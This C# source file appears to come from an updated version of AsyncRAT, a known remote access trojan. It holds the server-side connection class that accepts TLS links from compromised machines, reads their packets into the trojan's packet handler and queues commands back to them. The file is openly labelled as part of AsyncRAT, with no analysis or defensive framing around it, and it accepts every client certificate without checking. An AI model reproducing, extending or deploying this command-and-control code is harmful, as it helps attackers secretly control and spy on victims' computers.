using System.Buffers;
using System.Collections.Concurrent;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Authentication;
using System.Security.Cryptography.X509Certificates;
using System.Windows.Forms;
using Server.Helper;

namespace Server.Connection;

/// <summary>
/// Modern high-performance client connection for AsyncRAT (.NET 9.0)
/// </summary>
public sealed class ModernClient : IAsyncDisposable
{
    private readonly IAsyncRATLogger _logger;
    private readonly Socket _tcpSocket;
    private readonly CancellationTokenSource _cancellationTokenSource = new();
    private readonly SemaphoreSlim _sendLock = new(1, 1);
    private readonly ConcurrentQueue<ReadOnlyMemory<byte>> _sendQueue = new();
    
    private SslStream? _sslStream;
    private bool _disposed;
    private long _bytesReceived;
    private long _bytesSent;

    // Connection state
    public string Id { get; }
    public bool IsConnected { get; private set; }
    public DateTime ConnectedAt { get; private set; }
    public string RemoteEndPoint { get; }
    public ListViewItem? LV { get; set; }
    public ListViewItem? LV2 { get; set; }

    // Message processing
    private const int HeaderSize = 4;
    private const int MaxMessageSize = 100 * 1024 * 1024; // 100MB
    private const int BufferSize = 64 * 1024; // 64KB

    public ModernClient(string id, Socket tcpSocket, IAsyncRATLogger logger)
    {
        Id = id ?? throw new ArgumentNullException(nameof(id));
        _tcpSocket = tcpSocket ?? throw new ArgumentNullException(nameof(tcpSocket));
        _logger = logger ?? throw new ArgumentNullException(nameof(logger));
        
        RemoteEndPoint = _tcpSocket.RemoteEndPoint?.ToString() ?? "Unknown";
        ConnectedAt = DateTime.Now;
    }

    /// <summary>
    /// Initializes the client connection with SSL
    /// </summary>
    public async Task InitializeAsync(CancellationToken cancellationToken = default)
    {
        try
        {
            await _logger.DebugAsync($"Initializing client {Id}");

            // Create SSL stream
            var networkStream = new NetworkStream(_tcpSocket, ownsSocket: true);
            _sslStream = new SslStream(networkStream, false, ValidateClientCertificate);

            // Configure SSL options
            var sslOptions = new SslServerAuthenticationOptions
            {
                ServerCertificate = ModernConfigurationManager.Current.CertificatePath switch
                {
                    var path when File.Exists(path) => new X509Certificate2(path, ModernConfigurationManager.Current.CertificatePassword),
                    _ => null
                },
                EnabledSslProtocols = SslProtocols.Tls12 | SslProtocols.Tls13,
                CertificateRevocationCheckMode = X509RevocationMode.NoCheck,
                ClientCertificateRequired = false
            };

            // Authenticate as server
            await _sslStream.AuthenticateAsServerAsync(sslOptions, cancellationToken);

            IsConnected = true;
            await _logger.InfoAsync($"Client {Id} SSL handshake completed");

            // Start background tasks
            _ = Task.Run(() => ProcessSendQueueAsync(_cancellationTokenSource.Token), cancellationToken);
        }
        catch (Exception ex)
        {
            await _logger.ErrorAsync($"Failed to initialize client {Id}", ex);
            await DisconnectAsync();
            throw;
        }
    }

    /// <summary>
    /// Handles communication with the client
    /// </summary>
    public async Task HandleCommunicationAsync(CancellationToken cancellationToken = default)
    {
        if (!IsConnected || _sslStream is null)
        {
            await _logger.WarningAsync($"Client {Id} not properly initialized");
            return;
        }

        var buffer = ArrayPool<byte>.Shared.Rent(BufferSize);
        try
        {
            await _logger.DebugAsync($"Started communication handling for client {Id}");

            while (IsConnected && !cancellationToken.IsCancellationRequested)
            {
                try
                {
                    // Read message header
                    var headerBuffer = buffer.AsMemory(0, HeaderSize);
                    var bytesRead = await ReadExactAsync(headerBuffer, cancellationToken);
                    
                    if (bytesRead != HeaderSize)
                    {
                        await _logger.WarningAsync($"Client {Id} sent incomplete header");
                        break;
                    }

                    // Parse message length
                    var messageLength = BitConverter.ToInt32(headerBuffer.Span);
                    if (messageLength <= 0 || messageLength > MaxMessageSize)
                    {
                        await _logger.WarningAsync($"Client {Id} sent invalid message length: {messageLength}");
                        break;
                    }

                    // Read message body
                    var messageData = await ReadMessageAsync(messageLength, cancellationToken);
                    if (messageData.Length != messageLength)
                    {
                        await _logger.WarningAsync($"Client {Id} sent incomplete message");
                        break;
                    }

                    // Process message
                    await ProcessMessageAsync(messageData, cancellationToken);
                }
                catch (OperationCanceledException)
                {
                    break;
                }
                catch (Exception ex)
                {
                    await _logger.ErrorAsync($"Error handling communication for client {Id}", ex);
                    break;
                }
            }
        }
        finally
        {
            ArrayPool<byte>.Shared.Return(buffer);
            await _logger.DebugAsync($"Stopped communication handling for client {Id}");
        }
    }

    /// <summary>
    /// Sends data to the client asynchronously
    /// </summary>
    public async Task SendAsync(ReadOnlyMemory<byte> data, CancellationToken cancellationToken = default)
    {
        if (!IsConnected || _disposed || data.IsEmpty)
            return;

        // Queue message for sending
        _sendQueue.Enqueue(data);
        await _logger.DebugAsync($"Queued {data.Length} bytes for client {Id}");
    }

    /// <summary>
    /// Gets client statistics
    /// </summary>
    public async Task<ClientStatistics> GetStatisticsAsync()
    {
        return await Task.FromResult(new ClientStatistics
        {
            Id = Id,
            RemoteEndPoint = RemoteEndPoint,
            ConnectedAt = ConnectedAt,
            IsConnected = IsConnected,
            BytesReceived = Interlocked.Read(ref _bytesReceived),
            BytesSent = Interlocked.Read(ref _bytesSent),
            QueuedMessages = _sendQueue.Count
        });
    }

    /// <summary>
    /// Disconnects the client
    /// </summary>
    public async Task DisconnectAsync()
    {
        if (!IsConnected) return;

        try
        {
            IsConnected = false;
            _cancellationTokenSource.Cancel();

            await _logger.DebugAsync($"Disconnecting client {Id}");

            // Close SSL stream
            if (_sslStream is not null)
            {
                await _sslStream.DisposeAsync();
                _sslStream = null;
            }

            // Close TCP socket
            _tcpSocket?.Close();

            await _logger.InfoAsync($"Client {Id} disconnected");
        }
        catch (Exception ex)
        {
            await _logger.ErrorAsync($"Error disconnecting client {Id}", ex);
        }
    }

    private async Task<int> ReadExactAsync(Memory<byte> buffer, CancellationToken cancellationToken)
    {
        if (_sslStream is null) return 0;

        var totalBytesRead = 0;
        while (totalBytesRead < buffer.Length)
        {
            var bytesRead = await _sslStream.ReadAsync(
                buffer[totalBytesRead..], 
                cancellationToken);
            
            if (bytesRead == 0)
                break; // Connection closed
            
            totalBytesRead += bytesRead;
            Interlocked.Add(ref _bytesReceived, bytesRead);
        }

        return totalBytesRead;
    }

    private async Task<byte[]> ReadMessageAsync(int messageLength, CancellationToken cancellationToken)
    {
        var messageData = new byte[messageLength];
        var totalBytesRead = 0;

        while (totalBytesRead < messageLength && IsConnected)
        {
            var remainingBytes = messageLength - totalBytesRead;
            var bufferSize = Math.Min(remainingBytes, BufferSize);
            
            var bytesRead = await _sslStream!.ReadAsync(
                messageData.AsMemory(totalBytesRead, bufferSize), 
                cancellationToken);
            
            if (bytesRead == 0)
                break; // Connection closed
            
            totalBytesRead += bytesRead;
            Interlocked.Add(ref _bytesReceived, bytesRead);
        }

        return messageData;
    }

    private async Task ProcessMessageAsync(ReadOnlyMemory<byte> messageData, CancellationToken cancellationToken)
    {
        try
        {
            await _logger.DebugAsync($"Processing {messageData.Length} bytes from client {Id}");
            
            // Process message in thread pool to avoid blocking
            await Task.Run(() =>
            {
                // Convert to array for compatibility with existing packet handler
                var dataArray = messageData.ToArray();
                
                // Use existing packet processing logic
                Server.Handle_Packet.Packet.Read(dataArray);
            }, cancellationToken);
        }
        catch (Exception ex)
        {
            await _logger.ErrorAsync($"Error processing message from client {Id}", ex);
        }
    }

    private async Task ProcessSendQueueAsync(CancellationToken cancellationToken)
    {
        await _logger.DebugAsync($"Started send queue processing for client {Id}");

        using var timer = new PeriodicTimer(TimeSpan.FromMilliseconds(10));
        
        while (!cancellationToken.IsCancellationRequested && IsConnected)
        {
            try
            {
                // Process queued messages
                var messagesProcessed = 0;
                while (_sendQueue.TryDequeue(out var message) && messagesProcessed < 100)
                {
                    await SendMessageAsync(message, cancellationToken);
                    messagesProcessed++;
                }

                // Wait for next processing cycle
                if (messagesProcessed == 0)
                {
                    await timer.WaitForNextTickAsync(cancellationToken);
                }
            }
            catch (OperationCanceledException)
            {
                break;
            }
            catch (Exception ex)
            {
                await _logger.ErrorAsync($"Error processing send queue for client {Id}", ex);
                await Task.Delay(1000, cancellationToken); // Brief delay before retrying
            }
        }

        await _logger.DebugAsync($"Stopped send queue processing for client {Id}");
    }

    private async Task SendMessageAsync(ReadOnlyMemory<byte> message, CancellationToken cancellationToken)
    {
        if (!IsConnected || _sslStream is null) return;

        await _sendLock.WaitAsync(cancellationToken);
        try
        {
            // Send message length header
            var headerBytes = BitConverter.GetBytes(message.Length);
            await _sslStream.WriteAsync(headerBytes, cancellationToken);

            // Send message data
            if (message.Length > BufferSize)
            {
                // Send large message in chunks
                var remaining = message;
                while (!remaining.IsEmpty)
                {
                    var chunkSize = Math.Min(remaining.Length, BufferSize);
                    var chunk = remaining[..chunkSize];
                    
                    await _sslStream.WriteAsync(chunk, cancellationToken);
                    remaining = remaining[chunkSize..];
                    
                    Interlocked.Add(ref _bytesSent, chunkSize);
                }
            }
            else
            {
                // Send small message directly
                await _sslStream.WriteAsync(message, cancellationToken);
                Interlocked.Add(ref _bytesSent, message.Length);
            }

            await _sslStream.FlushAsync(cancellationToken);
            await _logger.DebugAsync($"Sent {message.Length} bytes to client {Id}");
        }
        catch (Exception ex)
        {
            await _logger.ErrorAsync($"Error sending message to client {Id}", ex);
            await DisconnectAsync();
        }
        finally
        {
            _sendLock.Release();
        }
    }

    private static bool ValidateClientCertificate(object sender, X509Certificate? certificate, X509Chain? chain, SslPolicyErrors sslPolicyErrors)
    {
        // For now, accept all client certificates
        // In production, implement proper certificate validation
        return true;
    }

    public async ValueTask DisposeAsync()
    {
        if (_disposed) return;
        
        _disposed = true;
        
        await DisconnectAsync();
        
        _cancellationTokenSource?.Dispose();
        _sendLock?.Dispose();
        _sslStream?.Dispose();
        _tcpSocket?.Dispose();
        
        await _logger.DebugAsync($"ModernClient {Id} disposed");
    }
}

/// <summary>
/// Client statistics record
/// </summary>
public sealed record ClientStatistics
{
    public required string Id { get; init; }
    public required string RemoteEndPoint { get; init; }
    public DateTime ConnectedAt { get; init; }
    public bool IsConnected { get; init; }
    public long BytesReceived { get; init; }
    public long BytesSent { get; init; }
    public int QueuedMessages { get; init; }
}